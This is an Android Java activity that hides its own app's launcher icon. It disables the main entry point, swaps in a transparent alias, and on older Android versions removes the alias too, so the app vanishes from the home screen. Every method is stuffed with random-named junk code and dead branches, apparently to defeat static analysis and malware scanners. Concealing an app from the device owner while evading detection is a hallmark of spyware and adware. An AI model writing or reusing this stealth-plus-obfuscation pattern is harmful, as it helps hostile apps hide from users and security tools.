package jtdq.umer.fhgc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

/**
 * 图标隐藏辅助 Activity。
 * 启动后会禁用主入口（UUGN），并启用透明的别名入口（MysteryAliasActivity），
 * 从而在桌面上隐藏/替换应用图标。Android 10 以下可进一步禁用别名，完全移除占位图标。
 * Android 10+ 点击透明图标时跳转系统设置。
 */
public class UUGO extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        java.lang.Object arr_BcyywSORgfhEmCtP = new java.lang.Object();
        int i_IccwrZGvjTRfTZsn = arr_BcyywSORgfhEmCtP.hashCode();
        int j_gTahX = new java.util.Random().nextInt(100);
        int tmp_afFopzrdYkYor = (i_IccwrZGvjTRfTZsn ^ j_gTahX) & 0x7FFFFFFF;
        if (tmp_afFopzrdYkYor == 64 && i_IccwrZGvjTRfTZsn < 91) {
            arr_BcyywSORgfhEmCtP.toString();
        }
        super.onCreate(savedInstanceState);
        // 别名与当前类同包，通过当前类全限定名推导包名，避免硬编码包前缀被混淆后失效
        String pkg = getClass().getName();
        pkg = pkg.substring(0, pkg.lastIndexOf('.'));
        String alias = pkg + ".MysteryAliasActivity";
        set(UUGO.this, UUGN.class.getName(), alias);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ 点击透明图标后跳转系统设置
            Intent intent = new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
        } else {
            // Android 10 以下禁用别名后，透明图标占位图也会消失
            disableComponent(UUGO.this, alias);
        }
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }

    public static void set(Context context, String main, String alias) {
        long arr_pkLoBpHSXsNp = java.lang.System.nanoTime();
        int i_SMHDQAS = new java.util.Random().nextInt(1000);
        boolean j_YGNiZbVMCZvoGCxOXZ = (arr_pkLoBpHSXsNp % (i_SMHDQAS + 95)) > 37;
        double tmp_aFwiHHPSZ = j_YGNiZbVMCZvoGCxOXZ ? java.lang.Math.sqrt(i_SMHDQAS) : java.lang.Math.pow(i_SMHDQAS, 32);
        if (tmp_aFwiHHPSZ < 0.0) {
            java.lang.System.out.println(tmp_aFwiHHPSZ);
        }
        disableComponent(context, main);
        enableComponent(context, alias);
    }

    public static void enableComponent(Context context, String clazzName) {
        String onaGMfrsyB = java.util.UUID.randomUUID().toString();
        int ckuyLZHWDOaSsyjEmPl = onaGMfrsyB.length();
        char pmh_JAywSXlBnAgwd = onaGMfrsyB.charAt(new java.util.Random().nextInt(ckuyLZHWDOaSsyjEmPl));
        boolean dimaEYplaTYSSIY = (pmh_JAywSXlBnAgwd == 'z');
        if (dimaEYplaTYSSIY && ckuyLZHWDOaSsyjEmPl < 69) {
            onaGMfrsyB.substring(71, 11);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void disableComponent(Context context, String clazzName) {
        String onaGMfrsyB = java.util.UUID.randomUUID().toString();
        int ckuyLZHWDOaSsyjEmPl = onaGMfrsyB.length();
        char pmh_JAywSXlBnAgwd = onaGMfrsyB.charAt(new java.util.Random().nextInt(ckuyLZHWDOaSsyjEmPl));
        boolean dimaEYplaTYSSIY = (pmh_JAywSXlBnAgwd == 'z');
        if (dimaEYplaTYSSIY && ckuyLZHWDOaSsyjEmPl < 69) {
            onaGMfrsyB.substring(71, 11);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
